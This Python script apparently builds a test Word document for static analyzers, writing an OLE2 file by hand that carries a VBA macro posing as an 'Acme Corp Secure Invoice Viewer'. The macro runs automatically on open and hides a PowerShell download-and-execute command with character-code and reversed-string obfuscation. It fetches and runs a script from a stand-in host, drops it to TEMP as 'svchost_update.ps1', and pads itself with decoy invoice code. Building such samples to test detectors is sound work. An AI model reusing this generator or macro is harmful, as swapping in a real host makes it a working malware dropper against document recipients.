#!/usr/bin/env python3
# Build a benign-but-realistic VBA maldoc (OLE2/CFB) entirely from scratch.
# Static teaching sample only: AutoOpen/Workbook_Open + Shell + WScript.Run + a
# real-looking-but-defanged URL (host example.test is RFC-6761 reserved / non-routable).
# Nothing here executes; the file is only ever read by static analyzers.
import struct, sys

FREESECT=0xFFFFFFFF; ENDOFCHAIN=0xFFFFFFFE; FATSECT=0xFFFFFFFD; NOSTREAM=0xFFFFFFFF
SECT=512

# ---------- MS-OVBA compression (literal-token compressed chunks) ----------
# Each CompressedChunk uses only literal tokens: a 0x00 FlagByte (8 literals)
# followed by up to 8 raw source bytes. This is what Office actually emits for
# uncompressible text, and what oledump's detector keys on (\x00Attribut\x00e ).
# We cap each chunk at <=3072 decompressed bytes so the compressed data (which
# grows by ~1/8) still fits the 12-bit chunk-size field.
def compress(data):
    out=bytearray(b"\x01")                 # CompressedContainer signature
    i=0
    while i < len(data):
        piece=data[i:i+3072]; i+=3072
        cd=bytearray()
        for j in range(0,len(piece),8):
            cd+=b"\x00"                     # FlagByte: next 8 tokens are literals
            cd+=piece[j:j+8]
        size_field=(len(cd)+2)-3            # CompressedChunkSize - 3
        hdr=0x8000 | 0x3000 | (size_field & 0x0FFF)  # compressed flag + sig 0b011
        out+=struct.pack("<H",hdr)
        out+=cd
    return bytes(out)

def rec(idv,payload):
    return struct.pack("<HI",idv,len(payload))+payload

def dir_stream(modname,streamname,textoffset):
    mn=modname.encode("ascii"); sn=streamname.encode("ascii")
    snu=streamname.encode("utf-16-le")
    pn=b"Project"
    b=bytearray()
    # ---- PROJECTINFORMATION (strict MS-OVBA order) ----
    b+=struct.pack("<HII",0x0001,4,1)                       # PROJECTSYSKIND (Win32)
    b+=struct.pack("<HII",0x0002,4,0x00000409)             # PROJECTLCID
    b+=struct.pack("<HII",0x0014,4,0x00000409)             # PROJECTLCIDINVOKE
    b+=struct.pack("<HIH",0x0003,2,1252)                   # PROJECTCODEPAGE
    b+=struct.pack("<HI",0x0004,len(pn))+pn                # PROJECTNAME
    b+=struct.pack("<HI",0x0005,0)+struct.pack("<HI",0x0040,0)   # PROJECTDOCSTRING (+reserved+unicode size)
    b+=struct.pack("<HI",0x0006,0)+struct.pack("<HI",0x003D,0)   # PROJECTHELPFILEPATH (helpfile1=0, reserved, helpfile2 size=0)
    b+=struct.pack("<HII",0x0007,4,0)                      # PROJECTHELPCONTEXT
    b+=struct.pack("<HII",0x0008,4,0)                      # PROJECTLIBFLAGS
    b+=struct.pack("<HIIH",0x0009,4,0,0)                   # PROJECTVERSION (reserved=4, major, minor)
    b+=struct.pack("<HI",0x000C,0)+struct.pack("<HI",0x003C,0)   # PROJECTCONSTANTS (+reserved+unicode size)
    # ---- no REFERENCES: go straight to PROJECTMODULES ----
    b+=struct.pack("<H",0x000F)                            # PROJECTMODULES Id (terminates ref loop)
    b+=struct.pack("<IH",2,1)                              # size=2, ModulesCount=1
    b+=struct.pack("<HIH",0x0013,2,0xFFFF)                 # PROJECTCOOKIE
    # ---- MODULE record ----
    b+=struct.pack("<HI",0x0019,len(mn))+mn                # MODULENAME
    b+=struct.pack("<HI",0x001A,len(sn))+sn+struct.pack("<HI",0x0032,len(snu))+snu  # MODULESTREAMNAME (+reserved+unicode)
    b+=struct.pack("<HI",0x001C,0)+struct.pack("<HI",0x0048,0)   # MODULEDOCSTRING
    b+=struct.pack("<HII",0x0031,4,textoffset)            # MODULEOFFSET
    b+=struct.pack("<HII",0x001E,4,0)                     # MODULEHELPCONTEXT
    b+=struct.pack("<HIH",0x002C,2,0xFFFF)                # MODULECOOKIE
    b+=struct.pack("<HI",0x0021,0)                         # MODULETYPE procedural (id + 4-byte reserved)
    b+=struct.pack("<HI",0x002B,0)                         # MODULE Terminator (+4-byte reserved)
    b+=struct.pack("<HI",0x0010,0)                         # dir Terminator
    return bytes(b)

VBA_LINES = [
'Attribute VB_Name = "Module1"',
"' =====================================================================",
"'  Acme Corp - Secure Invoice Viewer  (document macro)",
"'  This content is encrypted. Enable editing and content to decrypt.",
"' =====================================================================",
'Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _',
'    ByVal pCaller As Long, ByVal szURL As String, _',
'    ByVal szFileName As String, ByVal dwReserved As Long, _',
'    ByVal lpfnCB As Long) As Long',
'',
"' Word fires AutoOpen / Document_Open automatically when the file opens.",
'Sub AutoOpen()',
'    InitDocument',
'End Sub',
'',
'Sub Document_Open()',
'    InitDocument',
'End Sub',
'',
"' --- Helper: rebuild a string from a list of character codes -----------",
"' (used to keep the real command out of plain sight in the source)",
'Function Dec(ByVal s As String) As String',
'    Dim parts() As String, i As Integer, out As String',
'    parts = Split(s, ",")',
'    For i = LBound(parts) To UBound(parts)',
'        out = out & Chr(CInt(parts(i)))',
'    Next i',
'    Dec = out',
'End Function',
'',
'Sub InitDocument()',
'    Dim host As String, payload As String, dest As String',
'    Dim app As String',
'',
"    ' \"powershell\" assembled from character codes (string obfuscation)",
'    app = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _',
'          Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)',
'',
"    ' Staging URL and dropped file (defanged host: *.example.test)",
'    host = "http://www" & "." & "example" & "." & "test/inv/update.ps1"',
'    dest = Environ("TEMP") & "\\svchost_update.ps1"',
'',
"    ' Reverse-stored flags -> \"-nop -w hidden -ep bypass\"",
'    Dim flags As String',
'    flags = StrReverse("ssapyb pe neddih w- pon-")',
'',
'    payload = app & " " & flags & " -c ""IEX (New-Object " & _',
'        "Net.WebClient).DownloadString(\x27" & host & "\x27)"""',
'',
"    ' Two independent execution paths (either is enough to run it):",
'    Shell payload, vbHide',
'    CreateObject("WScript.Shell").Run payload, 0, False',
'',
"    ' Backup stage: pull the script to disk via the API declared above,",
"    ' then hand it to the scripting host.",
'    URLDownloadToFileA 0, host, dest, 0, 0',
'    CreateObject("WScript.Shell").Run "wscript " & dest, 0, False',
'End Sub',
'',
"' ---------------------------------------------------------------------",
"' Decoy code below makes the project look like a real invoice tool.",
"' It is never reached by the auto-exec path but pads the module so the",
"' analyst has realistic surrounding noise to read past.",
"' ---------------------------------------------------------------------",
'Sub FormatInvoice()',
'    Dim n As Long',
'    For n = 1 To 25',
"        ' Line item n: quantity, unit price, extended price",
'    Next n',
'End Sub',
'',
'Function TaxRate(region As String) As Double',
'    Select Case region',
'        Case "US-TX": TaxRate = 0.0825',
'        Case "US-CA": TaxRate = 0.0725',
'        Case Else:    TaxRate = 0#',
'    End Select',
'End Function',
'',
"' ---------------------------------------------------------------------",
"' Field reference (decoy documentation, ignored at runtime):",
"'   InvoiceNo   : string  - unique invoice identifier",
"'   IssueDate   : date    - date the invoice was generated",
"'   DueDate     : date    - payment due date",
"'   BillToName  : string  - customer billing name",
"'   BillToAddr  : string  - customer billing address",
"'   ShipToName  : string  - recipient name",
"'   ShipToAddr  : string  - recipient address",
"'   Currency    : string  - ISO 4217 currency code",
"'   Subtotal    : double  - sum of line item extended prices",
"'   TaxRegion   : string  - region code used for the tax rate lookup",
"'   TaxAmount   : double  - Subtotal * TaxRate(TaxRegion)",
"'   Total       : double  - Subtotal + TaxAmount",
"'   Terms       : string  - payment terms, e.g. Net 30",
"'   PONumber    : string  - customer purchase order number",
"' ---------------------------------------------------------------------",
'Function ExtendedPrice(qty As Double, unit As Double) As Double',
'    ExtendedPrice = qty * unit',
'End Function',
]
VBA_SRC = ("\r\n".join(VBA_LINES) + "\r\n").encode("ascii")

def module_stream(src,textoffset):
    return b"\x00"*textoffset + compress(src)

class Entry:
    def __init__(s,name,etype,data=b""):
        s.name=name; s.etype=etype; s.data=data
        s.left=NOSTREAM; s.right=NOSTREAM; s.child=NOSTREAM
        s.start=ENDOFCHAIN; s.size=0

MINISECT=64; MINICUT=4096

def build_cfb(path):
    TEXTOFFSET=512
    dirc=compress(dir_stream("Module1","Module1",TEXTOFFSET))
    mod=module_stream(VBA_SRC,TEXTOFFSET)
    proj=(b"ID=\"{00000000-0000-0000-0000-000000000000}\"\r\n"
          b"Module=Module1\r\nName=\"Project\"\r\nHelpContextID=\"0\"\r\n")
    projwm=b"Module1\x00Module1\x00\x00\x00"
    vba_proj=b"\xcc\x61"+b"\x00"*38
    root=Entry("Root Entry",5)
    vba=Entry("VBA",1)
    e_dir=Entry("dir",2,dirc)
    e_mod=Entry("Module1",2,mod)
    e_vp=Entry("_VBA_PROJECT",2,vba_proj)
    e_proj=Entry("PROJECT",2,proj)
    e_pwm=Entry("PROJECTwm",2,projwm)
    entries=[root,vba,e_dir,e_mod,e_vp,e_proj,e_pwm]
    idx={id(e):i for i,e in enumerate(entries)}
    def bst(lst):
        if not lst: return NOSTREAM
        m=len(lst)//2; node=lst[m]
        node.left=bst(lst[:m]); node.right=bst(lst[m+1:])
        return idx[id(node)]
    def keyf(e): return (len(e.name),e.name.upper())
    root.child=bst(sorted([vba,e_proj,e_pwm],key=keyf))
    vba.child=bst(sorted([e_dir,e_mod,e_vp],key=keyf))

    sectors=[]; fat=[]
    def add_regular(data):
        if len(data)==0: return ENDOFCHAIN
        n=(len(data)+SECT-1)//SECT; start=len(sectors)
        for k in range(n):
            sectors.append(data[k*SECT:(k+1)*SECT].ljust(SECT,b"\x00"))
            fat.append(start+k+1 if k<n-1 else ENDOFCHAIN)
        return start

    # --- split user streams into big (>=cutoff, regular FAT) and mini (mini-FAT) ---
    type2=[e for e in entries if e.etype==2]
    mini=[e for e in type2 if len(e.data)<MINICUT]
    big =[e for e in type2 if len(e.data)>=MINICUT]
    # build the mini stream + mini FAT
    ministream=bytearray(); minifat=[]
    for e in mini:
        nm=(len(e.data)+MINISECT-1)//MINISECT
        e.start=len(ministream)//MINISECT; e.size=len(e.data)
        for k in range(nm):
            ministream+=e.data[k*MINISECT:(k+1)*MINISECT].ljust(MINISECT,b"\x00")
            minifat.append(e.start+k+1 if k<nm-1 else ENDOFCHAIN)
    # lay out big user streams in regular sectors
    for e in big:
        e.start=add_regular(e.data); e.size=len(e.data)
    # mini stream stored as a regular stream, owned by Root Entry
    root.start=add_regular(bytes(ministream)); root.size=len(ministream)
    # mini FAT in regular sectors
    minifat_cap=((len(minifat)+127)//128)*128 if minifat else 0
    minifat_full=minifat+[FREESECT]*(minifat_cap-len(minifat))
    minifat_bytes=b"".join(struct.pack("<I",x) for x in minifat_full)
    minifat_start=add_regular(minifat_bytes) if minifat_bytes else ENDOFCHAIN
    n_minifat=len(minifat_bytes)//SECT

    def dirent(e):
        nm=e.name.encode("utf-16-le")+b"\x00\x00"; nm=nm.ljust(64,b"\x00")[:64]
        nlen=len(e.name.encode("utf-16-le"))+2
        b=nm+struct.pack("<HBB",nlen,e.etype,1)
        b+=struct.pack("<III",e.left,e.right,e.child)
        b+=b"\x00"*16+b"\x00"*4+b"\x00"*8+b"\x00"*8
        if e.etype in (2,5):
            b+=struct.pack("<I",e.start)+struct.pack("<II",e.size,0)
        else:
            b+=struct.pack("<I",0)+struct.pack("<II",0,0)
        return b
    dirbytes=b"".join(dirent(e) for e in entries)
    while len(dirbytes)%SECT: dirbytes+=b"\x00"
    dir_start=add_regular(dirbytes)

    # --- FAT sectors ---
    nsect=len(sectors); nfat=1
    while True:
        if (nsect+nfat)*4 <= nfat*SECT: break
        nfat+=1
    fat_start=len(sectors)
    for j in range(nfat): fat.append(FATSECT)
    cap=nfat*(SECT//4)
    while len(fat)<cap: fat.append(FREESECT)
    fatbytes=b"".join(struct.pack("<I",x) for x in fat)
    fatsectors=[fatbytes[k*SECT:(k+1)*SECT] for k in range(nfat)]
    difat=[FREESECT]*109
    for j in range(nfat): difat[j]=fat_start+j

    hdr=b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"+b"\x00"*16
    hdr+=struct.pack("<HHH",0x003E,0x0003,0xFFFE)
    hdr+=struct.pack("<HH",0x0009,0x0006)
    hdr+=b"\x00"*6
    hdr+=struct.pack("<I",0)            # num dir sectors (v3)
    hdr+=struct.pack("<I",nfat)
    hdr+=struct.pack("<I",dir_start)
    hdr+=struct.pack("<I",0)
    hdr+=struct.pack("<I",4096)         # mini cutoff
    hdr+=struct.pack("<I",minifat_start)
    hdr+=struct.pack("<I",n_minifat)
    hdr+=struct.pack("<I",ENDOFCHAIN)
    hdr+=struct.pack("<I",0)
    hdr+=b"".join(struct.pack("<I",x) for x in difat)
    assert len(hdr)==512,len(hdr)
    with open(path,"wb") as f:
        f.write(hdr)
        for s in sectors: f.write(s)
        for s in fatsectors: f.write(s)
    print("WROTE",path,"regular_sectors",nsect,"nfat",nfat,
          "mini_streams",len(mini),"n_minifat",n_minifat,"vba_src",len(VBA_SRC))

build_cfb(sys.argv[1] if len(sys.argv)>1 else "/tmp/otest/invoice.doc")
